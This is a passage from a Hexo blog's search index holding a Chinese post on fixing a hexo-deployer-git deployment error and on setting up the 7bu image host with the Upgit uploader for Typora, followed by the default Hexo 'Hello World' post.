ChildProcess.&lt;anonymous&gt; (D:\BlogFile\node_modules\hexo-deployer-git\node_modules\hexo-util\lib\spawn.js:51:21)</span><br><span class="line">    at ChildProcess.emit (node:events:518:28)</span><br><span class="line">    at cp.emit (D:\BlogFile\node_modules\cross-spawn\lib\enoent.js:34:29)</span><br><span class="line">    at ChildProcess._handle.onexit (node:internal/child_process:294:12)</span><br></pre></td></tr></table></figure><p>对应这个报错 目前我还没有非常完美的解决方法</p><p>遇到过几次了 用的是不同的解决放到 但是都不能完全解决这个问题 都是当时解决了 后面配置的时候又出现了</p><p>法1：</p><p>不管他 他过一会就会自己好 但是这个过一会没有非常精确的数据、</p><p>法2：</p><p>执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo cl</span><br></pre></td></tr></table></figure><p>这个方法有时奏效</p><p>法3：</p><p>更新npm</p><p>执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm update</span><br></pre></td></tr></table></figure><p>法4：</p><p>清除npm缓存 并重构依赖</p><p>先执行 清除缓存</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm cache clean --force</span><br></pre></td></tr></table></figure><p>再执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure><p>法5</p><p>这是我用的最离奇的方法 可能就是法1</p><p>当时是我查看hexo的报错日志 然后就直接好了</p><p>执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo deploy --debug</span><br></pre></td></tr></table></figure><p>很好又遇到这个问题 且上面的方法都不管用了 又找了个新方法 </p><p>法6：</p><p>改_config.yml文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo:https://github.com/YourName/YourName.github.io.git(不要使用这个)</span><br><span class="line">  git@github.com:YourName/YourName.github.io.git(用这个)</span><br><span class="line">  branch: master</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以 直接治本</p><h2 id="图床配置"><a href="#图床配置" class="headerlink" title="图床配置"></a>图床配置</h2><p>之前是用的picgo+github 但是他不是很稳定 所以这次我用的是<a href="https://7bu.top/">去不图床</a></p><p>这个比较便宜10块1G </p><p>用的时候直接上传 找URL就行</p><p><img src="https://bu.dusays.com/2024/05/12/6640e700d843e.png" alt="image-20240509020222854"></p><p>如果是去不图床的话 在连接typora的时候不能用picgo(不支持) 要用Upgit</p><p><strong>Upgit:</strong></p><p><a href="https://github.com/pluveto/upgit/releases">Upgit</a> 可以快捷地将文件上传到去不图床并得到其直链。简洁跨平台不常驻内存。可作为 Typora 自定义上传器使用</p><p>将下面代码保存为 <code>config.toml</code> 文件，其中 <code>TOKEN</code> 项，需改成自己的。注意 <code>TOKEN</code> 前的 <code>Bearer</code> 不要忘记添:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">default_uploader = &quot;lskypro2&quot;</span><br><span class="line">[uploaders.lskypro2]</span><br><span class="line">host = &quot;https://7bu.top&quot;</span><br><span class="line">token = &quot;Bearer TOKEN&quot;</span><br></pre></td></tr></table></figure><p>另外创建文件夹 <code>extensions</code>，并将下面代码保存为文件 <code>lskypro.jsonc</code>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;meta&quot;: &#123;</span><br><span class="line">        &quot;id&quot;: &quot;lskypro2&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;LskyPro2 Uploader&quot;,</span><br><span class="line">        &quot;type&quot;: &quot;simple-http-uploader&quot;,</span><br><span class="line">        &quot;version&quot;: &quot;2.0.0&quot;,</span><br><span class="line">        &quot;repository&quot;: &quot;&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;http&quot;: &#123;</span><br><span class="line">        &quot;request&quot;: &#123;</span><br><span class="line">            &quot;url&quot;: &quot;$(ext_config.host)/api/v1/upload&quot;,</span><br><span class="line">            &quot;method&quot;: &quot;POST&quot;,</span><br><span class="line">            &quot;headers&quot;: &#123;</span><br><span class="line">                &quot;Content-Type&quot;: &quot;multipart/form-data&quot;,</span><br><span class="line">                &quot;Authorization&quot;: &quot;$(ext_config.token)&quot;,</span><br><span class="line">                &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;body&quot;: &#123;</span><br><span class="line">                &quot;file&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;file&quot;,</span><br><span class="line">                    &quot;value&quot;: &quot;$(task.local_path)&quot;</span><br><span class="line">                &#125;,</span><br><span class="line">                &quot;token&quot;: &#123;</span><br><span class="line">                    &quot;type&quot;: &quot;string&quot;,</span><br><span class="line">                    &quot;value&quot;: &quot;$(ext_config.token)&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;upload&quot;: &#123;</span><br><span class="line">        &quot;rawUrl&quot;: &#123;</span><br><span class="line">            &quot;from&quot;: &quot;json_response&quot;,</span><br><span class="line">            &quot;path&quot;: &quot;data.links.url&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>拿token:</strong></p><p><img src="https://bu.dusays.com/2024/05/12/6640e6dbd2c23.png" alt="image-20240511175154599"></p><p>这里我只启用了上传图片</p><p><strong>使用方法：</strong></p><p>cmd到upgit目录下 执行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upgit.exe FILENAME</span><br></pre></td></tr></table></figure><p>就可以将图片上传到图床</p><p><strong>连接Typora:</strong></p><p>转到 Image 选自定义命令作为图像上传器，在命令文本框中输入 Upgit 程序位置，然后就可以使用了：</p><p><img src="https://bu.dusays.com/2024/05/11/663f484a10070.png" alt="image-20240511182823193"></p><p><img src="https://bu.dusays.com/2024/05/11/663f48650bed9.png" alt="image-20240511182850080"></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/05/02/hello-world/"/>
      <url>/2024/05/02/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
